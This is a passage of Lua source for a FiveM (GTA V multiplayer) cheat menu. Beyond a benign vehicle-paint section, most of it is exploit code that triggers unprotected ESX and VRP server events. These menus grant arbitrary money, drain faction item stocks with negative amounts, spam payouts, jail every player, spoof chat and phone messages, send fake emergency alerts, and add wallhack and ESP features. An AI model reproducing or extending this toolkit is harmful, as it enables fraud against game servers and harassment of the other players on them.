                  isPreviewing = false
                  oldmodtype = -1
                  oldmod = -1
                elseif isPreviewing and cursec ~= thePaint.id then
                  SetVehicleColours(veh,oldprim,thePaint.id)
                  isPreviewing = true
                end
              end
            end

            EVP.Display()
          elseif EVP.IsMenuOpened("classic3") then
            for theName,thePaint in pairs(paintsClassic) do
              _,ts = GetVehicleExtraColours(veh)
              if ts == thePaint.id and not isPreviewing then
                pricetext = "Installed"
              else
                if isPreviewing and ts == thePaint.id then
                  pricetext = "Previewing"
                else
                  pricetext = "Not Installed"
                end
              end
              _,currims = GetVehicleExtraColours(veh)
              if EVP.Button(thePaint.name, pricetext) then
                if not isPreviewing then
                  oldmodtype = "paint"
                  oldmodaction = false
                  oldprim,oldsec = GetVehicleColours(veh)
                  oldpearl,oldwheelcolour = GetVehicleExtraColours(veh)
                  oldmod = table.pack(oldprim,oldsec,oldpearl,oldwheelcolour)
                  SetVehicleExtraColours(veh, oldpearl,thePaint.id)

                  isPreviewing = true
                elseif isPreviewing and currims == thePaint.id then
                  SetVehicleExtraColours(veh, oldpearl,thePaint.id)
                  isPreviewing = false
                  oldmodtype = -1
                  oldmod = -1
                elseif isPreviewing and currims ~= thePaint.id then
                  SetVehicleExtraColours(veh, oldpearl,thePaint.id)
                  isPreviewing = true
                end
              end
            end
            EVP.Display()
          elseif EVP.IsMenuOpened("metallic3") then
            for theName,thePaint in pairs(paintsClassic) do
              _,ts = GetVehicleExtraColours(veh)
              if ts == thePaint.id and not isPreviewing then
                pricetext = "Installed"
              else
                if isPreviewing and ts == thePaint.id then
                  pricetext = "Previewing"
                else
                  pricetext = "Not Installed"
                end
              end
              _,currims = GetVehicleExtraColours(veh)
              if EVP.Button(thePaint.name, pricetext) then
                if not isPreviewing then
                  oldmodtype = "paint"
                  oldmodaction = false
                  oldprim,oldsec = GetVehicleColours(veh)
                  oldpearl,oldwheelcolour = GetVehicleExtraColours(veh)
                  oldmod = table.pack(oldprim,oldsec,oldpearl,oldwheelcolour)
                  SetVehicleExtraColours(veh, oldpearl,thePaint.id)

                  isPreviewing = true
                elseif isPreviewing and currims == thePaint.id then
                  SetVehicleExtraColours(veh, oldpearl,thePaint.id)
                  isPreviewing = false
                  oldmodtype = -1
                  oldmod = -1
                elseif isPreviewing and currims ~= thePaint.id then
                  SetVehicleExtraColours(veh, oldpearl,thePaint.id)
                  isPreviewing = true
                end
              end
            end
            EVP.Display()
          elseif EVP.IsMenuOpened("matte3") then
            for theName,thePaint in pairs(paintsMatte) do
              _,ts = GetVehicleExtraColours(veh)
              if ts == thePaint.id and not isPreviewing then
                pricetext = "Installed"
              else
                if isPreviewing and ts == thePaint.id then
                  pricetext = "Previewing"
                else
                  pricetext = "Not Installed"
                end
              end
              _,currims = GetVehicleExtraColours(veh)
              if EVP.Button(thePaint.name, pricetext) then
                if not isPreviewing then
                  oldmodtype = "paint"
                  oldmodaction = false
                  oldprim,oldsec = GetVehicleColours(veh)
                  oldpearl,oldwheelcolour = GetVehicleExtraColours(veh)
                  oldmod = table.pack(oldprim,oldsec,oldpearl,oldwheelcolour)
                  SetVehicleExtraColours(veh, oldpearl,thePaint.id)

                  isPreviewing = true
                elseif isPreviewing and currims == thePaint.id then
                  SetVehicleExtraColours(veh, oldpearl,thePaint.id)
                  isPreviewing = false
                  oldmodtype = -1
                  oldmod = -1
                elseif isPreviewing and currims ~= thePaint.id then
                  SetVehicleExtraColours(veh, oldpearl,thePaint.id)
                  isPreviewing = true
                end
              end
            end
            EVP.Display()
          elseif EVP.IsMenuOpened("metal3") then
            for theName,thePaint in pairs(paintsMetal) do
              _,ts = GetVehicleExtraColours(veh)
              if ts == thePaint.id and not isPreviewing then
                pricetext = "Installed"
              else
                if isPreviewing and ts == thePaint.id then
                  pricetext = "Previewing"
                else
                  pricetext = "Not Installed"
                end
              end
              _,currims = GetVehicleExtraColours(veh)
              if EVP.Button(thePaint.name, pricetext) then
                if not isPreviewing then
                  oldmodtype = "paint"
                  oldmodaction = false
                  oldprim,oldsec = GetVehicleColours(veh)
                  oldpearl,oldwheelcolour = GetVehicleExtraColours(veh)
                  oldmod = table.pack(oldprim,oldsec,oldpearl,oldwheelcolour)
                  SetVehicleExtraColours(veh, oldpearl,thePaint.id)

                  isPreviewing = true
                elseif isPreviewing and currims == thePaint.id then
                  SetVehicleExtraColours(veh, oldpearl,thePaint.id)
                  isPreviewing = false
                  oldmodtype = -1
                  oldmod = -1
                elseif isPreviewing and currims ~= thePaint.id then
                  SetVehicleExtraColours(veh, oldpearl,thePaint.id)
                  isPreviewing = true
                end
              end
            end

            EVP.Display()
          elseif EVP.IsMenuOpened(VMS) then -- vehicle menu
            drawDescription("Vehicle features for you", 0.80, 0.9)
            if EVP.MenuButton("~p~#~s~ ~b~LSC ~s~Customs", LSCC) then
            elseif EVP.MenuButton("~p~#~s~ Vehicle ~g~Boost", bmm) then
            elseif EVP.MenuButton("~p~#~s~ Vehicle List", CTSa) then
            elseif EVP.MenuButton("~p~#~s~ Global Car Trolls / AI", gccccc) then
            elseif EVP.MenuButton("~p~#~s~ Spawn & Attach ~s~Trailer", MTS) then
            elseif EVP.Button("Spawn ~r~Custom ~s~Vehicle") then
              spawnvehicle()
            elseif EVP.Button("~r~Delete ~s~Vehicle") then
              DelVeh(GetVehiclePedIsUsing(PlayerPedId(-1)))
            elseif EVP.Button("~g~Repair ~s~Vehicle") then
              repairvehicle()
            elseif EVP.Button("~g~Repair ~s~Engine") then
              repairengine()
            elseif EVP.Button('~g~Refuel ~s~Vehicle') then
              refuelcar()
            elseif EVP.Button("~g~Flip ~s~Vehicle") then
              daojosdinpatpemata()
            elseif EVP.CheckBox("~r~Seatbelt", seatbelt, function(enabled) seatbelt = enabled end) then
            elseif EVP.CheckBox("~r~No Collison", nocollision, function(enabled) nocollision = enabled end) then
            elseif EVP.CheckBox("~g~Super Handling", superGrip, function(enabled) superGrip = enabled enchancedGrip = false driftMode = false fdMode = false end) then
            elseif EVP.CheckBox("Enchanced Grip", enchancedGrip, function(enabled) superGrip = false enchancedGrip = enabled driftMode = false fdMode = false end) then
            elseif EVP.CheckBox("Drift Mode", driftMode, function(enabled) superGrip = false enchancedGrip = false driftMode = enabled fdMode = false end) then
            elseif EVP.CheckBox("Formula Drift Mode", fdMode, function(enabled) superGrip = false enchancedGrip = false driftMode = false fdMode = enabled end) then
            elseif EVP.CheckBox("Best Handling", speedDemon, function(enabled) speedDemon = enabled end) then
            elseif EVP.CheckBox("Vehicle Godmode", VehGod, function(enabled) VehGod = enabled end)then
            elseif EVP.CheckBox("~b~Waterproof ~s~Vehicle", waterp, function(enabled) waterp = enabled end) then
            elseif EVP.CheckBox("Speedboost ~g~SHIFT ~r~CTRL", VehSpeed, function(enabled) VehSpeed = enabled end) then
            end
            EVP.Display()
          elseif EVP.IsMenuOpened(gccccc) then
            if EVP.Button('~h~Configure AI ~g~Speed') then
              local cspeed = KeyboardInput('Enter Wanted MaxSpeed', '', 100)
              if cspeed ~= nil or cspeed ~= '' then
                aispeed = (cspeed .. '.0')
                SetDriveTaskMaxCruiseSpeed(GetPlayerPed(-1), tonumber(aispeed))
              end
              SetDriverAbility(GetPlayerPed(-1), 100.0)
            elseif EVP.Button('~h~AI Drive (~b~Waypoint ~o~Slow~s~)') then
              if DoesBlipExist(GetFirstBlipInfoId(8)) then
                local blipIterator = GetBlipInfoIdIterator(8)
                local blip = GetFirstBlipInfoId(8, blipIterator)
                local wp = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector())
                local ped = GetPlayerPed(-1)
                ClearPedTasks(ped)
                local v = GetVehiclePedIsIn(ped, false)
                TaskVehicleDriveToCoord(ped, v, wp.x, wp.y, wp.z, tonumber(aispeed), 156, v, 5, 1.0, true)
                SetDriveTaskDrivingStyle(ped, 8388636)
                speedmit = true
              end
            elseif EVP.Button('~h~AI Drive (~b~Waypoint ~g~Fast~s~)') then
              if DoesBlipExist(GetFirstBlipInfoId(8)) then
                local blipIterator = GetBlipInfoIdIterator(8)
                local blip = GetFirstBlipInfoId(8, blipIterator)
                local wp = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector())
                local ped = GetPlayerPed(-1)
                ClearPedTasks(ped)
                local v = GetVehiclePedIsIn(ped, false)
                TaskVehicleDriveToCoord(ped, v, wp.x, wp.y, wp.z, tonumber(aispeed), 156, v, 2883621, 5.5, true)
                SetDriveTaskDrivingStyle(ped, 2883621)
                speedmit = true
              end
            elseif EVP.Button('~h~AI Drive (~y~Wander~s~)') then
              local ped = GetPlayerPed(-1)
              ClearPedTasks(ped)
              local v = GetVehiclePedIsIn(ped, false)
              print('Configured speed is currently ' .. aispeed)
              TaskVehicleDriveWander(ped, v, tonumber(aispeed), 8388636)
            elseif EVP.Button('~h~~r~Stop AI') then
              speedmit = false
              if IsPedInAnyVehicle(GetPlayerPed(-1)) then
                ClearPedTasks(GetPlayerPed(-1))
              else
                ClearPedTasksImmediately(GetPlayerPed(-1))
              end
            end
            if EVP.CheckBox("~r~EMP~s~ Nearest Vehicles", destroyvehicles, function(enabled) destroyvehicles = enabled end) then
            elseif EVP.CheckBox("~r~Delete~s~ Nearest Vehicles", deletenearestvehicle, function(enabled) deletenearestvehicle = enabled end) then
            elseif EVP.CheckBox("~r~Launch~s~ Nearest Vehicles", lolcars, function(enabled) lolcars = enabled end) then
            elseif EVP.CheckBox("~r~Alarm~s~ Nearest Vehicles", alarmvehicles, function(enabled) alarmvehicles = enabled end) then
            elseif EVP.Button("~r~BORGAR~s~ Nearest Vehicles") then
              local hamburghash = GetHashKey("xs_prop_hamburgher_wl")
              for vehicle in EnumerateVehicles() do
                local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                AttachEntityToEntity(hamburger, vehicle, 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
              end
            elseif EVP.CheckBox("~r~Explode~s~ Nearest Vehicles", explodevehicles, function(enabled) explodevehicles = enabled end) then
            elseif EVP.CheckBox("~p~Fuck~s~ Nearest Vehicles", fuckallcars, function(enabled) fuckallcars = enabled end) then
            end

            --LUA MENUS
            EVP.Display()
          elseif EVP.IsMenuOpened(LMX) then
            drawDescription("All handy LUA triggers", 0.80, 0.9)
            if EVP.MenuButton("~p~#~s~ ~r~ESX ~s~Money", esms) then
            elseif EVP.MenuButton("~p~#~s~ ~r~ESX ~s~Misc", ESXC) then
            elseif EVP.MenuButton("~p~#~s~ ~r~ESX ~s~Items", ESXD) then
            elseif EVP.MenuButton("~p~#~s~ ~y~VRP ~s~Triggers", VRPT) then
            elseif EVP.MenuButton("~p~#~s~ ~b~Misc ~s~Triggers", MSTC) then
            end

            EVP.Display()
          elseif EVP.IsMenuOpened(esms) then -- ESX money menu
            if EVP.Button("~o~Automatic Money ~r~ WARNING!") then
              automaticmoneyesx()
            elseif EVP.Button("~g~ESX ~y~Caution Give Back") then
              local result = KeyboardInput("Enter amount of money", "", 100)
              if result ~= "" then
                TSE("esx_jobs:caution", "give_back", result)
              end
            elseif EVP.CheckBox("~g~ESX Hunting~y~ reward", huntspam, function(enabled) huntspam = enabled end) then
            elseif EVP.Button("~g~ESX ~y~Eden Garage") then
              local result = KeyboardInput("Enter amount of money", "", 100)
              if result ~= "" then
                TSE("eden_garage:payhealth", {costs = -result})
              end
            elseif EVP.Button("~g~ESX ~y~Fuel Delivery") then
              local result = KeyboardInput("Enter amount of money", "", 100)
              if result ~= "" then
                TSE("esx_fueldelivery:pay", result)
              end
            elseif EVP.Button("~g~ESX ~y~Car Thief") then
              local result = KeyboardInput("Enter amount of money", "", 100)
              if result ~= "" then
                TSE("esx_carthief:pay", result)
              end
            elseif EVP.Button("~g~ESX ~y~DMV School") then
              local result = KeyboardInput("Enter amount of money", "", 100)
              if result ~= "" then
                TSE("esx_dmvschool:pay", {costs = -result})
              end
            elseif EVP.Button("~g~ESX ~y~Dirty Job") then
              local result = KeyboardInput("Enter amount of money", "", 100)
              if result ~= "" then
                TSE("esx_godirtyjob:pay", result)
              end
            elseif EVP.Button("~g~ESX ~y~Pizza Boy") then
              local result = KeyboardInput("Enter amount of money", "", 100)
              if result ~= "" then
                TSE("esx_pizza:pay", result)
              end
            elseif EVP.Button("~g~ESX ~y~Ranger Job") then
              local result = KeyboardInput("Enter amount of money", "", 100)
              if result ~= "" then
                TSE("esx_ranger:pay", result)
              end
            elseif EVP.Button("~g~ESX ~y~Garbage Job") then
              local result = KeyboardInput("Enter amount of money", "", 100)
              if result ~= "" then
                TSE("esx_garbagejob:pay", result)
              end
            elseif EVP.Button("~g~ESX ~y~Car Thief ~r~DIRTY MONEY") then
              local result = KeyboardInput("Enter amount of dirty money", "", 100)
              if result ~= "" then
                TSE("esx_carthief:pay", result)
              end
            elseif EVP.Button("~g~ESX ~y~Trucker Job") then
              local result = KeyboardInput("Enter amount of money", "", 100)
              if result ~= "" then
                TSE("esx_truckerjob:pay", result)
              end
            elseif EVP.Button("~g~ESX ~y~Admin Give Bank") then
              local result = KeyboardInput("Enter amount of money", "", 100)
              if result ~= "" then
                TSE("AdminMenu:giveBank", result)
              end
            elseif EVP.Button("~g~ESX ~y~Admin Give Cash") then
              local result = KeyboardInput("Enter amount of money", "", 100)
              if result ~= "" then
                TSE("AdminMenu:giveCash", result)
              end
            elseif EVP.Button("~g~ESX ~y~Postal Job") then
              local result = KeyboardInput("Enter amount of money", "", 100)
              if result ~= "" then
                TSE("esx_gopostaljob:pay", result)
              end
            elseif EVP.Button("~g~ESX ~y~Banker Job") then
              local result = KeyboardInput("Enter amount of money", "", 100)
              if result ~= "" then
                TSE("esx_banksecurity:pay", result)
              end
            elseif EVP.Button("~g~ESX ~y~Slot Machine") then
              local result = KeyboardInput("Enter amount of money", "", 100)
              if result ~= "" then
                TSE("esx_slotmachine:sv:2", result)
              end
            elseif EVP.Button("~g~ESX ~y~Taxi") then
              local v = KeyboardInput("How many times?", "", 100)
              if v ~= "" then
                for i = 0, v do
                  TriggerServerEvent('esx_taxijob:success')
                end
              else
                notify("~b~Invalid amount~s~.", false)
              end
            elseif EVP.Button("~g~ESX ~y~House Robbery") then
              local v = KeyboardInput("How many times?", "", 100)
              if v ~= "" then
                for i = 0, v do
                  TriggerServerEvent('houseRobberies:giveMoney')
                end
              else
                notify("~b~Invalid amount~s~.", false)
              end
            elseif EVP.Button("~g~ESX ~y~Mug") then
              local v = KeyboardInput("How many times?", "", 100)
              if v ~= "" then
                for i = 0, v do
                  TriggerServerEvent("esx_mugging:giveMoney")
                end
              else
                notify("~b~Invalid amount~s~.", false)
              end
            elseif EVP.Button("~g~ESX ~y~Dirty Bank") then
              local v = KeyboardInput("How many times?", "", 100)
              if v ~= "" then
                for i = 0, v do
                  TriggerServerEvent("bankrobberies:receiveCash")
                end
              else
                notify("~b~Invalid amount~s~.", false)
              end
            end
            EVP.Display()
          elseif EVP.IsMenuOpened(ESXC) then -- ESX Misc menu
            drawDescription("ESX Triggers for thirst/hunger/dmv etc", 0.80, 0.9)
            if EVP.Button("~w~Set hunger to ~g~100") then
              TriggerEvent("esx_status:set", "hunger", 1000000)
              notify("Done")
            elseif EVP.Button("~w~Set thirst to ~g~100") then
              TriggerEvent("esx_status:set", "thirst", 1000000)
              notify("Done")
            elseif EVP.Button("~w~Set Stress to ~g~0") then
              TriggerEvent('esx_status:set', 'stress', 0)
              notify("Done")   
            elseif EVP.Button("~g~Remove GSR") then
              TriggerServerEvent('GSR:Remove')
              notify("Done")
            elseif EVP.Button("~y~No Hotwire") then
              local veh = GetVehiclePedIsIn(GetPlayerPed(-1), false)
              local plate = GetVehicleNumberPlateText(veh)
              if plate ~= "" then
                TriggerServerEvent('garage:addKeys', plate)
                SetVehicleEngineOn(veh, true, false)
                notify("Done")
              else 
                notify("Not in car")
              end
            elseif EVP.Button("Get Driving License") then
              TSE("esx_dmvschool:addLicense", 'dmv')
              TSE("esx_dmvschool:addLicense", 'drive')
              TSE("esx_dmvschool:addLicense", 'drive_bike')
              TSE("esx_dmvschool:addLicense", 'drive_truck')
              notify("Done")
            elseif EVP.Button("~b~Buy ~s~a vehicle for ~g~free") then
              matacumparamasini()
            elseif EVP.Button("~r~ESX ~s~Open Menu Jail") then
              TriggerEvent("esx-qalle-jail:openJailMenu")
              EVP.CloseMenu()
            elseif EVP.Button("Send Discord Message") then
                local Message = KeyboardInput("Enter message to send", "", 100)
                TriggerServerEvent("DiscordBot:playerDied", Message, "1337")
                notify("Sent message!")
              elseif EVP.Button("Send police alert on waypoint") then
                local playerPed = PlayerPedId()
                if DoesBlipExist(GetFirstBlipInfoId(8)) then
                  local blipIterator = GetBlipInfoIdIterator(8)
                  local blip = GetFirstBlipInfoId(8, blipIterator)
                  WaypointCoords = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector()) 
                  TriggerServerEvent('esx_addons_gcphone:startCall', 'police', "Fight in progress: a civilian has been spotted fighting", WaypointCoords)
                  notify("~g~police alert sent to waypoint!")
                else
                  notify("~r~No waypoint set!")
                end
            elseif EVP.Button("Send ambulance alert on waypoint") then
              local playerPed = PlayerPedId()
              if DoesBlipExist(GetFirstBlipInfoId(8)) then
                local blipIterator = GetBlipInfoIdIterator(8)
                local blip = GetFirstBlipInfoId(8, blipIterator)
                WaypointCoords = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector()) 
                TriggerServerEvent('esx_addons_gcphone:startCall', 'ambulance', "medical attention required: unconscious citizen!", WaypointCoords)
                notify("~g~Ambulance alert sent to waypoint!")
              else
                notify("~r~No waypoint set!")
              end
            elseif EVP.Button("Send mechanic alert on waypoint") then
              local playerPed = PlayerPedId()
              if DoesBlipExist(GetFirstBlipInfoId(8)) then
                local blipIterator = GetBlipInfoIdIterator(8)
                local blip = GetFirstBlipInfoId(8, blipIterator)
                WaypointCoords = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector()) 
                TriggerServerEvent('esx_addons_gcphone:startCall', 'mechanic', "mechanic required: broken down vehicle!", WaypointCoords)
                notify("~g~Mechanic alert sent to waypoint!")
              else
                notify("~r~No waypoint set!")
              end
            elseif EVP.Button("Spoof text message (GCPHONE)") then
                local transmitter = KeyboardInput("Enter transmitting phone number", "", 10)
                local receiver = KeyboardInput("Enter receiving phone number", "", 10)
                local message = KeyboardInput("Enter message to send", "", 100)
                if transmitter then
                  if receiver then
                    if message then
                      TriggerServerEvent('gcPhone:_internalAddMessage', transmitter, receiver, message, 0)
                    else
                      notify("~r~You must specify a message.")
                    end
                  else
                    notify("~r~You must specify a receiving number.")
                  end
                else
                  notify("~r~You must specify a transmitting number.")
                end
            elseif EVP.Button("Spoof Chat Message") then
                local name = KeyboardInput("Enter chat sender name", "", 15)
                local message = KeyboardInput("Enter your message to send", "", 70)
                if name and message then
                  TriggerServerEvent('_chat:messageEntered', name, {0, 0x99, 255}, message)
                end
            elseif EVP.Button("~c~Open Mechanic Menu") then
              TriggerEvent("esx_society:openBossMenu", "mecano", function(data, menu) setMenuVisible(currentMenu, false) end)
            elseif EVP.Button("~b~Open Police Menu") then
              TriggerEvent("esx_society:openBossMenu","police",function(data, menu) setMenuVisible(currentMenu, false) end)
            elseif EVP.Button("~r~Open Ambulance Menu") then
              TriggerEvent("esx_society:openBossMenu","ambulance",function(data, menu) setMenuVisible(currentMenu, false) end)
            elseif EVP.Button("~y~Open Taxi Menu") then
              TriggerEvent("esx_society:openBossMenu","taxi",function(data, menu) setMenuVisible(currentMenu, false) end)
            elseif EVP.Button("~g~Open Real Estate Menu") then
              TriggerEvent("esx_society:openBossMenu","realestateagent",function(data, menu) setMenuVisible(currentMenu, false) end)
            elseif EVP.Button("~p~Open Gang Menu") then
              TriggerEvent("esx_society:openBossMenu","gang",function(data, menu) setMenuVisible(currentMenu, false) end)
            elseif EVP.Button("~o~Open Car Dealer Menu") then
              TriggerEvent("esx_society:openBossMenu","cardealer",function(data, menu) setMenuVisible(currentMenu, false) end)
            elseif EVP.Button("~y~Open Banker Menu") then
              TriggerEvent("esx_society:openBossMenu","banker",function(data, menu) setMenuVisible(currentMenu, false) end)  
            end
            EVP.Display()
          elseif EVP.IsMenuOpened(ESXD) then -- ESX items menu
            drawDescription("ESX Triggers for drugs", 0.80, 0.9)
            if EVP.Button("~g~Harvest ~g~Weed") then
              hweed()
            elseif EVP.Button("~g~Transform ~g~Weed") then
              tweed()
            elseif EVP.Button("~g~Sell ~g~Weed") then
              sweed()
            elseif EVP.Button("~w~Harvest ~w~Coke") then
              hcoke()
            elseif EVP.Button("~w~Transform ~w~Coke") then
              tcoke()
            elseif EVP.Button("~w~Sell ~w~Coke") then
              scoke()
            elseif EVP.Button("~r~Harvest Meth") then
              hmeth()
            elseif EVP.Button("~r~Transform Meth") then
              tmeth()
            elseif EVP.Button("~r~Sell Meth") then
              smeth()
            elseif EVP.Button("~p~Harvest Opium") then
              hopi()
            elseif EVP.Button("~p~Transform Opium") then
              topi()
            elseif EVP.Button("~p~Sell Opium") then
              sopi()
            elseif EVP.Button("~p~Sell Drugs") then
              sdrugs()
            elseif EVP.Button("~g~Money Wash") then
              mataaspalarufe()
            elseif EVP.Button("~r~Stop all") then
              matanumaispalarufe()
            elseif EVP.Button("~r~Collect Jewelry") then
              jewelry()
            elseif EVP.Button("~r~Sell Jewelry") then
              TriggerServerEvent('lester:vendita')
            elseif EVP.Button("Give items from ~y~mug") then
              local itemName = KeyboardInput("Enter item name", "", 20)
              if itemName then
                TriggerServerEvent('esx_mugging:giveItems', (itemName))
                notify("Successfully given item ~g~")
              else
                notify("~r~You must specify an item")
              end
            elseif EVP.Button("~p~Random items from Houses") then
              local v = KeyboardInput("How many times?", "", 100)
              if v ~= "" then
                for i = 0, v do
                  TriggerServerEvent('houseRobberies:searchItem')
                end
              else
                notify("~b~Invalid amount~s~.", false)
              end
            elseif EVP.Button("Spawn items from ~y~police") then
              local itemName = KeyboardInput("Enter item name", "", 100)
              if itemName then 
              local itemAmount =  KeyboardInput("Enter amount", "", 100)
                if itemAmount then
                  TriggerServerEvent('esx_policejob:putStockItems', (itemName),-(itemAmount))
                end
              end
            elseif EVP.Button("Spawn items from ~y~mech") then
              local itemName = KeyboardInput("Enter item name", "", 100)
              if itemName then
                local itemAmount =  KeyboardInput("Enter amount", "", 100)
                if itemAmount then
                  TriggerServerEvent('esx_mechanicjob:putStockItems', (itemName),-(itemAmount))
                end
              end
            elseif EVP.Button("Spawn items from ~y~vehshop") then
              local itemName = KeyboardInput("Enter item name", "", 100)
              if itemName then 
              local itemAmount =  KeyboardInput("Enter amount", "", 100)
              if itemAmount then
                TriggerServerEvent('esx_vehicleshop:putStockItems', itemName2,-(itemAmount2))
                end
              end
            elseif EVP.Button("Spawn items from ~y~nightclub") then
              local itemName = KeyboardInput("Enter item name", "", 100)
              if itemName then
                local itemAmount =  KeyboardInput("Enter amount", "", 100)
                if itemAmount then
                  TriggerServerEvent('esx_nightclub:putStockItems', (itemName),-(itemAmount))
                end
              end
            elseif EVP.Button("Spawn items from ~y~casino") then
              local itemName = KeyboardInput("Enter item name", "", 100)
              if itemName then
                local itemAmount =  KeyboardInput("Enter amount", "", 100)
                if itemAmount then
                  TriggerServerEvent('program-casino:putStockItems', (itemName),-(itemAmount))
                end
              end
            elseif EVP.Button("Spawn items from ~y~fib") then
              local itemName = KeyboardInput("Enter item name", "", 100)
              if itemName then
                local itemAmount =  KeyboardInput("Enter amount", "", 100)
                if itemAmount then TriggerServerEvent('esx_fib:putStockItems', (itemName),-(itemAmount))
                end
              end
            elseif EVP.Button("Spawn items from ~y~taxi") then
              local itemName = KeyboardInput("Enter item name", "", 100)
              if itemName then 
              local itemAmount =  KeyboardInput("Enter amount", "", 100)
                if itemAmount then
                  TriggerServerEvent('esx_taxijob:putStockItems', (itemName), -(itemAmount))
                end
              end
            elseif EVP.Button("Spawn items from ~y~thelostmc") then
              local itemName = KeyboardInput("Enter item name", "", 100)
              if itemName then
                local itemAmount =  KeyboardInput("Enter amount", "", 100)
                if itemAmount then
                  TriggerServerEvent('esx_thelostmcjob:putStockItems', (itemName),-(itemAmount))
                end
              end
            elseif EVP.Button("Spawn items from ~y~cartel") then
              local itemName = KeyboardInput("Enter item name", "", 100)
              if itemName then 
                local itemAmount =  KeyboardInput("Enter amount", "", 100)
                if itemAmount then TriggerServerEvent('esx_carteljob:putStockItems', (itemName),-(itemAmount))
                end
              end
            elseif EVP.Button("Spawn items from ~y~mafia") then
              local itemName = KeyboardInput("Enter item name", "", 100)
              if itemName then
                local itemAmount =  KeyboardInput("Enter amount", "", 100)
                if itemAmount then
                  TriggerServerEvent('esx_mafiajob:putStockItems', (itemName),-(itemAmount))
                end
              end
            elseif EVP.CheckBox("~r~Blow Drugs Up ~y~DANGER!",BlowDrugsUp,function(enabled)BlowDrugsUp = enabled end) then
            end
            EVP.Display()
          elseif EVP.IsMenuOpened(VRPT) then -- VRP menu
            drawDescription("Basic VRP Triggers", 0.80, 0.9)
            if EVP.Button("~r~VRP ~s~Give Money ~ypayGarage") then
              local result = KeyboardInput("Enter amount of money", "", 100)
              if result ~= "" then
                TSE("lscustoms:payGarage", {costs = -result})
              end
            elseif EVP.Button("~r~VRP ~g~PayCheck Abuse") then
              local v = KeyboardInput("How many times?", "", 100)
              if v ~= "" then
                for i = 0,v do
                  TSE('paychecks:bonus')
                  TSE('paycheck:bonus')
                end
              else
                notify("~b~Invalid amount~s~.", false)
              end
            elseif EVP.Button("~r~VRP ~g~SalaryPay Abuse","You need a job!") then
              local v = KeyboardInput("How many times?", "", 100)
              if v ~= "" then
                for i = 0,v do
                  TSE('paychecks:salary')
                  TSE('paycheck:salary')
                end
              else
                notify("~b~Invalid amount~s~.", false)
              end
            elseif EVP.Button("~r~VRP ~g~WIN ~s~Slot Machine") then
              local result = KeyboardInput("Enter amount of money", "", 100)
              if result ~= "" then
                TSE("vrp_slotmachine:server:2",result)
              end
            elseif EVP.Button("~r~VRP ~s~Get driving license") then
              TSE("dmv:success")
              TSE("dmv:success", drive)
              TSE("dmv:success", drive_bike)
              TSE("dmv:success", drive_truck)
            elseif EVP.Button("~r~VRP ~s~Bank Deposit") then
              local result = KeyboardInput("Enter amount of money", "", 100)
              if result ~= "" then
                TSE("Banca:deposit", result)
                TSE("bank:deposit", result)
              end
            elseif EVP.Button("~r~VRP ~s~Bank Withdraw ") then
              local result = KeyboardInput("Enter amount of money", "", 100)
              if result ~= "" then
                TSE("bank:withdraw", result)
                TSE("Banca:withdraw", result)
              end
            end

            EVP.Display()
          elseif EVP.IsMenuOpened(MSTC) then
            drawDescription("Fun triggers to play with", 0.80, 0.9)
            if EVP.Button("Send Fake Message") then
              local pname = KeyboardInput("Enter player name", "", 100)
              if pname then
                local message = KeyboardInput("Enter message", "", 1000)
                if message then
                  TSE("_chat:messageEntered", pname, { 0, 0x99, 255 }, message)
                end
              end
            end

            EVP.Display()
          elseif EVP.IsMenuOpened(advm) then -- advanced menu
            if EVP.MenuButton("~p~#~s~ Destroyer Menu", dddd) then
            elseif EVP.MenuButton("~p~#~s~ ESP Menu", espa) then

            elseif EVP.Button("~g~OptimizeFPS") then
              optFPS()
	          elseif EVP.CheckBox("Player Blips", showblip, function(enabled) showblip = enabled end) then
            elseif EVP.CheckBox("Name Above Players n Indicator v1", nameabove1, function(enabled) nameabove1 = enabled nameabove2 = false nameabove3 = false end) then
            elseif EVP.CheckBox("Name Above Players n Indicator v2", nameabove2, function(enabled) nameabove1 = false nameabove2 = enabled nameabove3 = false  end) then
            elseif EVP.CheckBox("Name Above Players n Indicator v3", nameabove3, function(enabled) nameabove1 = false nameabove2 = false nameabove3 = enabled  end) then
            elseif EVP.CheckBox('~h~~y~Spectator Warning', specwarning, function(dl) specwarning = dl end) then
            elseif EVP.CheckBox('~h~Force 3rd Person Far', thirdperson, function(dl) thirdperson = dl end) then
            elseif EVP.Button('~h~Wall Script') then
              wallin()
            elseif EVP.CheckBox('~h~RCS', norecoil, function(dl) norecoil = dl end) then
            elseif EVP.CheckBox("~y~Jesus~s~Mode", dio, function(enabled) dio = enabled end) then
            elseif EVP.ComboBox("~y~Jesus~s~Mode Radius", JesusRadiusOps, currJesusRadiusIndex, selJesusRadiusIndex, function(currentIndex, selectedIndex)
              currJesusRadiusIndex = currentIndex
              selJesusRadiusIndex = currentIndex
              JesusRadius = JesusRadiusOps[currentIndex]
              end) then
            elseif EVP.CheckBox("Magnet ~r~Boy", magnet, function(enabled) MagnetoBoy() end) then

            end
            EVP.Display()
          elseif EVP.IsMenuOpened(CMSMS) then
            drawDescription("Crosshairs modifications", 0.80, 0.9)
            if EVP.CheckBox("~y~Original ~s~Crosshair", crosshair, function (enabled) crosshair = enabled crosshairc = false crosshairc2 = false end) then
            elseif EVP.CheckBox("~r~CROSS ~s~Crosshair", crosshairc, function (enabled) crosshair = false crosshairc = enabled crosshairc2 = false end) then
            elseif EVP.CheckBox("~r~DOT ~s~Crosshair", crosshairc2, function (enabled) crosshair = false crosshairc = false crosshairc2 = enabled end) then
            end
            EVP.Display()
          elseif EVP.IsMenuOpened(GAPA) then -- all menu
            if EVP.Button("~r~Jail~s~ All players") then
                jailall()
              elseif EVP.Button('~g~UnJail~s~ All players') then
                for i = 0, 128 do
                    TriggerServerEvent('esx-qalle-jail:jailPlayer', GetPlayerServerId(i), 0, 'escaperino' )
                    TriggerServerEvent('esx_jailer:sendToJail', GetPlayerServerId(i), 0)
                    TriggerServerEvent('esx_jail:sendToJail', GetPlayerServerId(i), 0 )
                    TriggerServerEvent('js:jailuser', GetPlayerServerId(i), 0, 'escaperino' )
                end
              elseif EVP.Button("~r~Banana ~p~Party~s~ All players") then
                bananapartyall()
